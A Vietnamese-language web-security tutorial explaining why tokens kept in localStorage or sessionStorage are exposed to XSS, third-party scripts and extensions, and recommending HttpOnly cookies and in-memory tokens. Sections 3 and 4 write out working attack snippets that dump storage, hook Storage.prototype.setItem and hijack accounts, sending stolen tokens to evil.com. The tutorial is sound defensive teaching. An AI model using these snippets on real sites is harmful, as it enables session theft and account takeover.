# localStorage & sessionStorage — Tại Sao KHÔNG An Toàn? Deep Dive!

> **Chủ đề**: Why is storing sensitive data in localStorage or sessionStorage potentially insecure?
> **Ngôn ngữ**: Tiếng Việt — giải thích cực kỳ chi tiết!
> **Phương châm**: Tự viết lại bằng tay — KHÔNG dùng thư viện!

---

## Mục Lục

1. [§1. Web Storage API Là Gì?](#1)
2. [§2. Bên Trong Browser — Storage Hoạt Động Thế Nào?](#2)
3. [§3. Tại Sao KHÔNG An Toàn? — 7 Lý Do Chi Tiết!](#3)
4. [§4. Tự Viết — Demo Tấn Công Đánh Cắp Từ Storage!](#4)
5. [§5. Tự Viết — So Sánh Storage vs Cookie vs Memory!](#5)
6. [§6. Tự Viết — Secure Storage Wrapper!](#6)
7. [§7. Alternatives — Giải Pháp Thay Thế Đúng Cách!](#7)
8. [§8. Tổng Kết & Câu Hỏi Phỏng Vấn!](#8)

---

## §1. Web Storage API Là Gì?

### 1.1. Định Nghĩa & So Sánh!

```
  WEB STORAGE API — TỔNG QUAN:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  Browser cung cấp 2 STORAGE mechanisms:                │
  │                                                        │
  │  ┌──────────────────────┐  ┌──────────────────────┐   │
  │  │    localStorage      │  │   sessionStorage     │   │
  │  │                      │  │                      │   │
  │  │  ✦ Persist MÃI MÃI   │  │  ✦ Chỉ trong 1 tab  │   │
  │  │    (đóng browser     │  │    (đóng tab → MẤT!) │   │
  │  │    vẫn còn!)         │  │                      │   │
  │  │  ✦ Shared giữa       │  │  ✦ KHÔNG shared      │   │
  │  │    các tabs           │  │    giữa các tabs     │   │
  │  │  ✦ ~5-10MB           │  │  ✦ ~5-10MB           │   │
  │  │  ✦ Same-origin only  │  │  ✦ Same-origin only  │   │
  │  │  ✦ Synchronous API   │  │  ✦ Synchronous API   │   │
  │  └──────────────────────┘  └──────────────────────┘   │
  │                                                        │
  │  CHUNG:                                                │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  ① Key-Value store (string only!)               │  │
  │  │  ② Accessible by ANY JavaScript trên page!      │  │
  │  │  ③ KHÔNG có expiration tự động!                  │  │
  │  │  ④ KHÔNG gửi theo HTTP requests!                │  │
  │  │  ⑤ KHÔNG có encryption!                         │  │
  │  │  ⑥ KHÔNG có access control!                     │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 1.2. API Cơ Bản!

```javascript
// ═══════════════════════════════════════════════════════════
// WEB STORAGE API — CÁCH DÙNG:
// ═══════════════════════════════════════════════════════════

// ① localStorage:
localStorage.setItem("key", "value"); // Lưu
localStorage.getItem("key"); // Đọc → "value"
localStorage.removeItem("key"); // Xóa 1 item
localStorage.clear(); // Xóa TẤT CẢ
localStorage.length; // Số items
localStorage.key(0); // Key ở index 0

// ② sessionStorage — CÙNG API CHÍNH XÁC:
sessionStorage.setItem("key", "value");
sessionStorage.getItem("key");

// ③ Lưu Object — phải serialize:
var user = { name: "An", role: "admin" };
localStorage.setItem("user", JSON.stringify(user));
var parsed = JSON.parse(localStorage.getItem("user"));

// ④ Storage event (cross-tab):
window.addEventListener("storage", function (event) {
  console.log("Key:", event.key);
  console.log("Old:", event.oldValue);
  console.log("New:", event.newValue);
  console.log("URL:", event.url);
});
// → CHỈ fire khi localStorage thay đổi ở TAB KHÁC!
// → sessionStorage KHÔNG fire cross-tab!
```

---

## §2. Bên Trong Browser — Storage Hoạt Động Thế Nào?

```
  BROWSER STORAGE ARCHITECTURE:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  Browser Process                                       │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │                                                  │  │
  │  │  Tab 1 (myapp.com)    Tab 2 (myapp.com)          │  │
  │  │  ┌────────────────┐  ┌────────────────┐          │  │
  │  │  │ JS Engine      │  │ JS Engine      │          │  │
  │  │  │                │  │                │          │  │
  │  │  │ sessionStorage │  │ sessionStorage │          │  │
  │  │  │ (RIÊNG tab 1!) │  │ (RIÊNG tab 2!) │          │  │
  │  │  └───────┬────────┘  └───────┬────────┘          │  │
  │  │          │                   │                    │  │
  │  │          ↓                   ↓                    │  │
  │  │  ┌──────────────────────────────────────┐        │  │
  │  │  │        localStorage (SHARED!)        │        │  │
  │  │  │   myapp.com → { key: value, ... }    │        │  │
  │  │  │   (MỌI TAB đều đọc/ghi được!)       │        │  │
  │  │  └──────────────────────────────────────┘        │  │
  │  │                    │                              │  │
  │  │                    ↓                              │  │
  │  │  ┌──────────────────────────────────────┐        │  │
  │  │  │        DISK (File System)            │        │  │
  │  │  │   SQLite / LevelDB                   │        │  │
  │  │  │   → PLAIN TEXT trên ổ cứng!          │        │  │
  │  │  │   → KHÔNG MÃ HÓA!                   │        │  │
  │  │  └──────────────────────────────────────┘        │  │
  │  │                                                  │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  SAME-ORIGIN POLICY:                                   │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  Origin = Protocol + Host + Port                 │  │
  │  │                                                  │  │
  │  │  https://myapp.com:443  → Storage A              │  │
  │  │  https://myapp.com:443  → Storage A (CÙNG!)      │  │
  │  │  http://myapp.com:80    → Storage B (KHÁC!)      │  │
  │  │  https://evil.com:443   → Storage C (KHÁC!)      │  │
  │  │                                                  │  │
  │  │  → Khác origin = KHÔNG đọc được storage!         │  │
  │  │  → NHƯNG nếu XSS inject vào CÙNG origin         │  │
  │  │    → ĐỌC ĐƯỢC TẤT CẢ!                           │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

```javascript
// ═══════════════════════════════════════════════════════════
// TỰ VIẾT — MÔ PHỎNG STORAGE INTERNAL:
// ═══════════════════════════════════════════════════════════

function MockStorage(type) {
  // Storage lưu data dạng key-value PLAIN TEXT:
  var _data = {}; // Object lưu data
  var _type = type; // 'local' hoặc 'session'

  // QUAN TRỌNG: Data lưu dạng STRING!
  // → KHÔNG encryption!
  // → KHÔNG hashing!
  // → PLAIN TEXT trên disk!

  this.setItem = function (key, value) {
    // Luôn convert sang string:
    var stringValue = String(value);
    var oldValue = _data[key] || null;
    _data[key] = stringValue;

    // Fire storage event (cho tabs khác):
    if (_type === "local") {
      fireStorageEvent(key, oldValue, stringValue);
    }
  };

  this.getItem = function (key) {
    // BẤT KỲ SCRIPT NÀO cũng gọi được!
    // → Third-party scripts
    // → Browser extensions
    // → Injected XSS code
    return _data.hasOwnProperty(key) ? _data[key] : null;
  };

  this.removeItem = function (key) {
    delete _data[key];
  };

  this.clear = function () {
    _data = {};
  };

  Object.defineProperty(this, "length", {
    get: function () {
      return Object.keys(_data).length;
    },
  });

  this.key = function (index) {
    var keys = Object.keys(_data);
    return index < keys.length ? keys[index] : null;
  };

  // ⚠️ SECURITY ISSUE:
  // Không có authentication, authorization, hay encryption!
  // Bất kỳ JS code nào trên page đều FULL ACCESS!
}
```

---

## §3. Tại Sao KHÔNG An Toàn? — 7 Lý Do Chi Tiết!

### LÝ DO 1: XSS Đọc Được Toàn Bộ!

```
  LÝ DO #1 — XSS ACCESS:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  XSS (Cross-Site Scripting) là MỐI ĐE DỌA LỚN NHẤT!  │
  │                                                        │
  │  Nếu app có 1 lỗ hổng XSS → hacker inject script:    │
  │                                                        │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  // Hacker inject script này vào app:            │  │
  │  │  var allData = {};                               │  │
  │  │  for (var i = 0; i < localStorage.length; i++) { │  │
  │  │    var key = localStorage.key(i);                │  │
  │  │    allData[key] = localStorage.getItem(key);     │  │
  │  │  }                                               │  │
  │  │  // Gửi TẤT CẢ về hacker:                       │  │
  │  │  fetch('https://evil.com/steal', {               │  │
  │  │    method: 'POST',                               │  │
  │  │    body: JSON.stringify(allData)                  │  │
  │  │  });                                             │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  → Chỉ CẦN 1 lỗ XSS → MẤT TẤT CẢ trong storage!    │
  │  → Tokens, user data, preferences → TẤT CẢ LỘ!       │
  │                                                        │
  │  SO SÁNH với HttpOnly Cookie:                          │
  │  localStorage:    XSS → đọc được!     ❌               │
  │  HttpOnly Cookie: XSS → KHÔNG đọc được! ✅             │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### LÝ DO 2: Third-Party Scripts Đọc Được!

```javascript
// ═══════════════════════════════════════════════════════════
// LÝ DO #2 — THIRD-PARTY SCRIPTS!
// ═══════════════════════════════════════════════════════════

// App thường include nhiều third-party scripts:
// <script src="https://analytics.com/tracker.js"></script>
// <script src="https://ads.com/banner.js"></script>
// <script src="https://cdn.com/library.js"></script>

// → TẤT CẢ scripts này chạy CÙNG ORIGIN!
// → TẤT CẢ đều đọc được localStorage!

// Ví dụ: Analytics script bị compromise:
// File analytics.js bình thường track page views
// Nhưng hacker sửa file → thêm code đánh cắp:
(function () {
  // Code tracking bình thường...
  trackPageView();

  // Code malicious được thêm vào:
  var token = localStorage.getItem("accessToken");
  var userData = localStorage.getItem("user");
  if (token) {
    new Image().src =
      "https://evil.com/collect" +
      "?token=" +
      encodeURIComponent(token) +
      "&user=" +
      encodeURIComponent(userData);
  }
})();
// → User KHÔNG BIẾT!
// → Token bị đánh cắp SILENT!

// ⚠️ THỰC TẾ: Supply chain attacks rất phổ biến:
// → event-stream npm package (2018) — 2M downloads/week
// → ua-parser-js (2021) — 8M downloads/week
// → Cả hai đều bị inject malicious code!
```

### LÝ DO 3: Browser Extensions Đọc Được!

```
  LÝ DO #3 — BROWSER EXTENSIONS:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  Browser extensions có quyền ĐỌC localStorage!        │
  │                                                        │
  │  Extension với "storage" permission:                   │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  // Extension content script:                    │  │
  │  │  // Chạy TRONG context của trang web!            │  │
  │  │                                                  │  │
  │  │  var tokens = localStorage.getItem('token');     │  │
  │  │  var session = sessionStorage.getItem('session');│  │
  │  │                                                  │  │
  │  │  // Gửi về extension background:                │  │
  │  │  chrome.runtime.sendMessage({                    │  │
  │  │    type: 'STOLEN_DATA',                          │  │
  │  │    tokens: tokens,                               │  │
  │  │    session: session                              │  │
  │  │  });                                             │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  → Malicious extensions CÓ THỂ đánh cắp data!        │
  │  → User cài extension "tiện ích" → bị steal data!    │
  │  → 2023: Hàng loạt Chrome extensions bị phát hiện     │
  │    chứa code đánh cắp data từ localStorage!           │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### LÝ DO 4: Dữ Liệu Lưu PLAIN TEXT Trên Disk!

```
  LÝ DO #4 — PLAIN TEXT ON DISK:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  localStorage lưu trên ổ cứng KHÔNG MÃ HÓA!           │
  │                                                        │
  │  Chrome:                                               │
  │  ~/Library/Application Support/Google/Chrome/           │
  │    Default/Local Storage/leveldb/                       │
  │  → File LevelDB chứa data PLAIN TEXT!                  │
  │                                                        │
  │  Firefox:                                              │
  │  ~/Library/Application Support/Firefox/Profiles/        │
  │    xxx.default/webappsstore.sqlite                     │
  │  → SQLite database PLAIN TEXT!                         │
  │                                                        │
  │  ⚠️ AI CÓ THỂ ĐỌC?                                    │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  ① Malware trên máy → đọc file trực tiếp!      │  │
  │  │  ② Người dùng máy chung → truy cập file!       │  │
  │  │  ③ Backup không encrypt → lộ data!              │  │
  │  │  ④ Forensic tools → recover data đã xóa!       │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### LÝ DO 5: Không Có Expiration Tự Động!

```javascript
// ═══════════════════════════════════════════════════════════
// LÝ DO #5 — NO AUTO-EXPIRATION!
// ═══════════════════════════════════════════════════════════

// localStorage KHÔNG BAO GIỜ TỰ HẾT HẠN:
localStorage.setItem("token", "jwt_abc123");
// → Token này tồn tại MÃI MÃI!
// → Đóng browser → vẫn còn!
// → 1 tháng sau → vẫn còn!
// → KHÔNG có Max-Age hay Expires!

// ⚠️ VẤN ĐỀ:
// → Máy tính công cộng (thư viện, quán net):
//   User đăng nhập → đóng tab → KHÔNG logout
//   → Người sau mở cùng trang → ĐỌC ĐƯỢC token!
//   → Đăng nhập bằng account người trước!

// → sessionStorage tốt hơn chút (hết khi đóng tab)
//   NHƯNG vẫn bị XSS đọc khi tab đang mở!

// SO SÁNH với Cookie:
// Cookie: Set-Cookie: token=abc; Max-Age=3600  → tự xóa sau 1 giờ!
// localStorage: .setItem('token', 'abc')       → KHÔNG BAO GIỜ XÓA!
```

### LÝ DO 6: Không Tự Gửi Theo Request — Nhưng Đó Lại Là Bẫy!

```
  LÝ DO #6 — FALSE SENSE OF SECURITY:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  "localStorage không tự gửi → an toàn hơn Cookie!"   │
  │  → HIỂU SAI!                                          │
  │                                                        │
  │  ĐÚNG: localStorage không auto-send trong requests    │
  │  → Developer phải TỰ đọc và gắn vào header:          │
  │                                                        │
  │  var token = localStorage.getItem('token');            │
  │  fetch('/api/data', {                                  │
  │    headers: { 'Authorization': 'Bearer ' + token }     │
  │  });                                                   │
  │                                                        │
  │  BẪY: Điều này tạo CẢM GIÁC KIỂM SOÁT nhưng:         │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  ① Token nằm trong JS code → XSS đọc được!     │  │
  │  │  ② Token nằm trong HTTP header → Network log!   │  │
  │  │  ③ Hacker inject code → gọi API thay user!      │  │
  │  │                                                  │  │
  │  │  // Hacker XSS code:                             │  │
  │  │  var t = localStorage.getItem('token');           │  │
  │  │  fetch('/api/transfer', {                        │  │
  │  │    method: 'POST',                               │  │
  │  │    headers: { 'Authorization': 'Bearer '+t },    │  │
  │  │    body: JSON.stringify({                        │  │
  │  │      to: 'hacker_account', amount: 10000         │  │
  │  │    })                                            │  │
  │  │  });                                             │  │
  │  │  // → Chuyển tiền thay user! KHÔNG CẦN biết      │  │
  │  │  //   password, chỉ cần token từ localStorage!  │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### LÝ DO 7: Shared Across Tabs (localStorage)!

```javascript
// ═══════════════════════════════════════════════════════════
// LÝ DO #7 — SHARED ACROSS TABS!
// ═══════════════════════════════════════════════════════════

// localStorage shared giữa TẤT CẢ tabs cùng origin:
// Tab 1: localStorage.setItem('token', 'user_A_token');
// Tab 2: localStorage.getItem('token'); → "user_A_token"!

// ⚠️ VẤN ĐỀ:
// → Tab 1 bị XSS → hacker đọc token
// → Token này CŨNG LÀ token dùng ở Tab 2, Tab 3...
// → Hacker dùng token → access MỌI session!

// → sessionStorage tốt hơn (per-tab isolation)
//   NHƯNG vẫn bị XSS đọc trong cùng tab!

// SO SÁNH TỔNG QUAN:
// ┌──────────────┬───────────────┬───────────────────┐
// │ Tiêu chí     │ localStorage  │ sessionStorage    │
// ├──────────────┼───────────────┼───────────────────┤
// │ XSS Access   │ ❌ Bị đọc     │ ❌ Bị đọc         │
// │ 3rd-party JS │ ❌ Bị đọc     │ ❌ Bị đọc         │
// │ Extensions   │ ❌ Bị đọc     │ ❌ Bị đọc         │
// │ Persistence  │ ❌ Vĩnh viễn  │ ✅ Đóng tab = xóa │
// │ Cross-tab    │ ❌ Shared     │ ✅ Isolated       │
// │ Disk storage │ ❌ Plain text │ ❌ Plain text     │
// │ Encryption   │ ❌ Không      │ ❌ Không          │
// │ Auto-expire  │ ❌ Không      │ ⚠️ Khi đóng tab  │
// └──────────────┴───────────────┴───────────────────┘
// → CẢ HAI đều BỊ XSS ĐỌC → KHÔNG AN TOÀN cho tokens!
```

---

## §4. Tự Viết — Demo Tấn Công Đánh Cắp Từ Storage!

```javascript
// ═══════════════════════════════════════════════════════════
// DEMO TẤN CÔNG — STEAL DATA TỪ STORAGE!
// ═══════════════════════════════════════════════════════════

// ① ATTACK 1: Đánh cắp TẤT CẢ localStorage:
function stealAllLocalStorage() {
  var stolen = {};
  for (var i = 0; i < localStorage.length; i++) {
    var key = localStorage.key(i);
    stolen[key] = localStorage.getItem(key);
  }
  // Exfiltrate:
  var img = new Image();
  img.src =
    "https://evil.com/collect?d=" + encodeURIComponent(JSON.stringify(stolen));
  return stolen;
}

// ② ATTACK 2: Persistent backdoor:
function installBackdoor() {
  // Override Storage.prototype.setItem:
  var originalSetItem = Storage.prototype.setItem;
  Storage.prototype.setItem = function (key, value) {
    // Gọi original:
    originalSetItem.call(this, key, value);
    // Đồng thời gửi về hacker:
    if (key.match(/token|session|auth|jwt|key/i)) {
      new Image().src =
        "https://evil.com/intercept" +
        "?key=" +
        encodeURIComponent(key) +
        "&val=" +
        encodeURIComponent(value);
    }
  };
  // → MỌI lần app lưu token → hacker BIẾT NGAY!
  // → Kể cả token mới sau khi refresh!
}

// ③ ATTACK 3: Token hijacking + API abuse:
function hijackSession() {
  var token =
    localStorage.getItem("accessToken") ||
    localStorage.getItem("jwt") ||
    localStorage.getItem("token");
  if (!token) return;

  // Dùng token để gọi API thay user:
  fetch("/api/user/profile", {
    headers: { Authorization: "Bearer " + token },
  })
    .then(function (r) {
      return r.json();
    })
    .then(function (user) {
      // Lấy thông tin cá nhân:
      fetch("https://evil.com/profile", {
        method: "POST",
        body: JSON.stringify(user),
      });
    });

  // Thay đổi email → chiếm account:
  fetch("/api/user/update", {
    method: "PUT",
    headers: {
      Authorization: "Bearer " + token,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ email: "hacker@evil.com" }),
  });
}

// ④ ATTACK 4: Đánh cắp từ sessionStorage:
function stealSessionStorage() {
  // sessionStorage CŨNG bị XSS đọc khi tab đang mở!
  var data = {};
  for (var i = 0; i < sessionStorage.length; i++) {
    var key = sessionStorage.key(i);
    data[key] = sessionStorage.getItem(key);
  }
  navigator.sendBeacon("https://evil.com/steal", JSON.stringify(data));
  // sendBeacon: gửi data ngay cả khi user đóng tab!
}
```

---

## §5. Tự Viết — So Sánh Storage vs Cookie vs Memory!

```
  SO SÁNH TOÀN DIỆN — NƠI LƯU TOKENS:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │             localStorage  HttpOnly   In-Memory         │
  │                           Cookie     (Closure)         │
  │  ─────────────────────────────────────────────────     │
  │  XSS đọc?    ❌ ĐƯỢC      ✅ KHÔNG   ⚠️ Khó hơn       │
  │  CSRF?       ✅ Immune   ❌ Dễ bị   ✅ Immune          │
  │  Persist?    ✅ Có       ✅ Có      ❌ Mất khi refresh │
  │  Encrypt?    ❌ Không    ❌ Không   N/A                │
  │  Auto-expire?❌ Không    ✅ Max-Age ❌ Không            │
  │  Cross-tab?  ✅ Shared   ✅ Shared  ❌ Per-tab          │
  │  3rd-party?  ❌ Đọc được ✅ Không   ⚠️ Khó             │
  │  Capacity    ~5-10MB     ~4KB      Unlimited          │
  │                                                        │
  │  VERDICT:                                              │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  Tokens, Secrets → HttpOnly Cookie + Memory!    │  │
  │  │  User preferences → localStorage OK!            │  │
  │  │  Form drafts → sessionStorage OK!               │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

```javascript
// ═══════════════════════════════════════════════════════════
// TỰ VIẾT — SO SÁNH BẰNG CODE:
// ═══════════════════════════════════════════════════════════

// ❌ localStorage — XSS ĐỌC ĐƯỢC:
localStorage.setItem("jwt", "eyJhbG...");
// Hacker XSS: localStorage.getItem('jwt') → STOLEN!

// ❌ Cookie (JS-accessible) — XSS ĐỌC ĐƯỢC:
document.cookie = "jwt=eyJhbG...";
// Hacker XSS: document.cookie → STOLEN!

// ✅ HttpOnly Cookie — XSS KHÔNG ĐỌC ĐƯỢC:
// Server: Set-Cookie: jwt=eyJhbG...; HttpOnly; Secure
// Hacker XSS: document.cookie → "" (KHÔNG thấy!)
// Browser tự gắn cookie vào requests → không cần JS!

// ✅ In-Memory — XSS khó truy cập hơn:
var TokenStore = (function () {
  var _token = null; // Closure — không global!
  return {
    set: function (t) {
      _token = t;
    },
    get: function () {
      return _token;
    },
  };
})();
// Hacker XSS: Phải tìm đúng biến/closure → KHÓ HƠN!
// (nhưng không impossible nếu hacker biết code structure)
```

---

## §6. Tự Viết — Secure Storage Wrapper!

```javascript
// ═══════════════════════════════════════════════════════════
// SECURE STORAGE WRAPPER — TỰ VIẾT!
// Nếu BẮT BUỘC phải dùng localStorage cho non-sensitive data:
// ═══════════════════════════════════════════════════════════

var SecureStorage = (function () {
  // ① OBFUSCATE KEY NAMES (không để lộ mục đích):
  function hashKey(key) {
    // Simple hash — không dùng cho crypto!
    var hash = 0;
    for (var i = 0; i < key.length; i++) {
      var char = key.charCodeAt(i);
      hash = (hash << 5) - hash + char;
      hash = hash & hash; // Convert to 32bit
    }
    return "ss_" + Math.abs(hash).toString(36);
  }

  // ② THÊM EXPIRATION:
  function setItem(key, value, ttlSeconds) {
    var item = {
      v: value,
      t: Date.now() + (ttlSeconds || 3600) * 1000,
    };
    var hashedKey = hashKey(key);
    localStorage.setItem(hashedKey, JSON.stringify(item));
  }

  // ③ CHECK EXPIRATION KHI ĐỌC:
  function getItem(key) {
    var hashedKey = hashKey(key);
    var raw = localStorage.getItem(hashedKey);
    if (!raw) return null;

    try {
      var item = JSON.parse(raw);
      // Kiểm tra hết hạn:
      if (Date.now() > item.t) {
        localStorage.removeItem(hashedKey);
        return null; // Đã hết hạn!
      }
      return item.v;
    } catch (e) {
      localStorage.removeItem(hashedKey);
      return null;
    }
  }

  // ④ INTEGRITY CHECK (phát hiện tampering):
  function setItemWithIntegrity(key, value) {
    var checksum = simpleChecksum(key + ":" + value);
    var item = { v: value, c: checksum, t: Date.now() + 3600000 };
    localStorage.setItem(hashKey(key), JSON.stringify(item));
  }

  function getItemWithIntegrity(key) {
    var raw = localStorage.getItem(hashKey(key));
    if (!raw) return null;
    try {
      var item = JSON.parse(raw);
      if (Date.now() > item.t) return null;
      // Verify integrity:
      var expected = simpleChecksum(key + ":" + item.v);
      if (item.c !== expected) {
        // Data bị thay đổi!
        localStorage.removeItem(hashKey(key));
        return null;
      }
      return item.v;
    } catch (e) {
      return null;
    }
  }

  function simpleChecksum(str) {
    var hash = 5381;
    for (var i = 0; i < str.length; i++) {
      hash = (hash << 5) + hash + str.charCodeAt(i);
    }
    return (hash >>> 0).toString(36);
  }

  // ⑤ CLEAR EXPIRED ITEMS:
  function clearExpired() {
    var keys = [];
    for (var i = 0; i < localStorage.length; i++) {
      keys.push(localStorage.key(i));
    }
    for (var j = 0; j < keys.length; j++) {
      if (keys[j].indexOf("ss_") === 0) {
        try {
          var item = JSON.parse(localStorage.getItem(keys[j]));
          if (Date.now() > item.t) {
            localStorage.removeItem(keys[j]);
          }
        } catch (e) {
          localStorage.removeItem(keys[j]);
        }
      }
    }
  }

  return {
    setItem: setItem,
    getItem: getItem,
    setItemWithIntegrity: setItemWithIntegrity,
    getItemWithIntegrity: getItemWithIntegrity,
    clearExpired: clearExpired,
  };
})();

// ⚠️ QUAN TRỌNG:
// Wrapper này KHÔNG làm localStorage an toàn cho tokens!
// Nó chỉ thêm expiration + integrity cho NON-SENSITIVE data!
// TOKENS VẪN PHẢI DÙNG HttpOnly Cookie hoặc In-Memory!

// SỬ DỤNG — CHỈ CHO DATA KHÔNG NHẠY CẢM:
// SecureStorage.setItem('theme', 'dark', 86400);  // 24h
// SecureStorage.setItem('lang', 'vi', 2592000);   // 30 days
```

---

## §7. Alternatives — Giải Pháp Thay Thế Đúng Cách!

```
  GIẢI PHÁP ĐÚNG — THEO LOẠI DATA:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ① ACCESS TOKENS:                                      │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  ❌ localStorage.setItem('token', jwt)           │  │
  │  │  ✅ var _token = jwt; (in-memory closure!)       │  │
  │  │  → Mất khi refresh → dùng refresh token!        │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  ② REFRESH TOKENS:                                     │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  ❌ localStorage.setItem('refresh', token)       │  │
  │  │  ✅ Set-Cookie: refresh=token;                   │  │
  │  │     HttpOnly; Secure; SameSite=Strict            │  │
  │  │  → JS không đọc được! Browser tự gửi!           │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  ③ API SECRET KEYS:                                    │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  ❌ localStorage hoặc BẤT KỲ client storage     │  │
  │  │  ✅ Server-side ONLY! (env vars, vault)          │  │
  │  │  → Dùng BFF pattern nếu cần gọi 3rd-party API! │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  ④ USER PREFERENCES (theme, lang):                     │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  ✅ localStorage OK! (non-sensitive data)        │  │
  │  │  → Không chứa thông tin nhạy cảm!               │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  ⑤ FORM DRAFTS:                                        │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  ✅ sessionStorage OK! (tạm thời, per-tab)      │  │
  │  │  → Tự xóa khi đóng tab!                         │  │
  │  │  → KHÔNG lưu passwords trong drafts!             │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

```javascript
// ═══════════════════════════════════════════════════════════
// TỰ VIẾT — AUTH PATTERN ĐÚNG CÁCH!
// ═══════════════════════════════════════════════════════════

// ✅ PATTERN: Access Token in Memory + Refresh in HttpOnly Cookie:
var AuthManager = (function () {
  // Private — XSS khó access:
  var _accessToken = null;

  return {
    // Login → lưu token trong memory:
    handleLogin: function (response) {
      _accessToken = response.accessToken;
      // Server đã set HttpOnly cookie cho refresh token!
    },

    // API call → dùng memory token:
    getAuthHeaders: function () {
      if (!_accessToken) return {};
      return { Authorization: "Bearer " + _accessToken };
    },

    // Refresh → server đọc HttpOnly cookie:
    refresh: function () {
      return fetch("/api/auth/refresh", {
        method: "POST",
        credentials: "include", // Gửi HttpOnly cookie!
      })
        .then(function (res) {
          return res.json();
        })
        .then(function (data) {
          _accessToken = data.accessToken; // Cập nhật memory!
        });
    },

    // Logout → xóa memory + server xóa cookie:
    handleLogout: function () {
      _accessToken = null;
      return fetch("/api/auth/logout", {
        method: "POST",
        credentials: "include",
      });
    },
  };
})();
```

---

## §8. Tổng Kết & Câu Hỏi Phỏng Vấn!

### 8.1. Tổng Kết!

```
  TẠI SAO STORAGE KHÔNG AN TOÀN — TỔNG KẾT:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  7 LÝ DO CHÍNH:                                        │
  │                                                        │
  │  ① XSS đọc được TOÀN BỘ storage!                      │
  │  ② Third-party scripts có FULL access!                 │
  │  ③ Browser extensions đọc được!                        │
  │  ④ Data lưu PLAIN TEXT trên disk!                      │
  │  ⑤ localStorage KHÔNG tự hết hạn!                     │
  │  ⑥ Token trong JS code → có thể bị abuse!             │
  │  ⑦ localStorage shared giữa tất cả tabs!              │
  │                                                        │
  │  NGUYÊN TẮC:                                           │
  │  → Tokens → KHÔNG localStorage! Dùng Memory/Cookie!   │
  │  → Secrets → KHÔNG client! Dùng Server!               │
  │  → Preferences → localStorage OK!                     │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 8.2. Câu Hỏi Phỏng Vấn!

**❓ Q1: Tại sao lưu tokens trong localStorage không an toàn?**

> localStorage dễ bị tấn công XSS — chỉ cần 1 lỗ hổng XSS, hacker inject script gọi `localStorage.getItem('token')` là đánh cắp được token. Ngoài ra, **mọi JavaScript** trên trang đều đọc được (third-party analytics, ads scripts), **browser extensions** với content scripts cũng truy cập được, và data lưu **plain text** trên ổ cứng. localStorage còn **không tự hết hạn** nên token tồn tại mãi mãi, nguy hiểm trên máy tính public.

**❓ Q2: sessionStorage có an toàn hơn localStorage không?**

> sessionStorage tốt hơn **một chút**: tự xóa khi đóng tab, không shared giữa các tabs. NHƯNG vẫn **không an toàn**: XSS vẫn đọc được khi tab đang mở, third-party scripts vẫn access được, vẫn lưu plain text trên disk. Kết luận: sessionStorage chỉ an toàn hơn về persistence và isolation, nhưng **vẫn vulnerable với XSS** — vẫn không nên dùng cho tokens.

**❓ Q3: Nếu không dùng localStorage, lưu tokens ở đâu?**

> **Access token** → lưu **in-memory** (biến JS trong closure/module scope). Mất khi refresh page nhưng XSS khó đọc hơn. **Refresh token** → lưu trong **HttpOnly cookie** (JS không đọc được, browser tự gửi). Khi user refresh page → gọi `/api/auth/refresh` → server đọc HttpOnly cookie → trả access token mới → lưu trong memory.

**❓ Q4: Same-Origin Policy không bảo vệ localStorage sao?**

> Same-Origin Policy chặn **cross-origin** access — `evil.com` không đọc được localStorage của `myapp.com`. NHƯNG XSS attack chạy **within same origin**! Khi hacker inject script vào `myapp.com`, script đó chạy với origin `myapp.com` → đọc được mọi thứ trong localStorage. Same-Origin Policy chỉ bảo vệ giữa các origins, **không bảo vệ khi code malicious chạy trong cùng origin**.

**❓ Q5: Supply chain attack ảnh hưởng thế nào đến localStorage?**

> Khi third-party package bị compromise (VD: `event-stream` 2018, `ua-parser-js` 2021), code malicious được thêm vào package → chạy trên trang web → đọc được localStorage. Vì mọi JavaScript chạy CÙNG origin đều có FULL access, việc lưu tokens trong localStorage = **trao token cho mọi dependency** trong app. HttpOnly cookie immune vì JS không đọc được dù code malicious có chạy.

---

> 📝 **Ghi nhớ cuối cùng:**
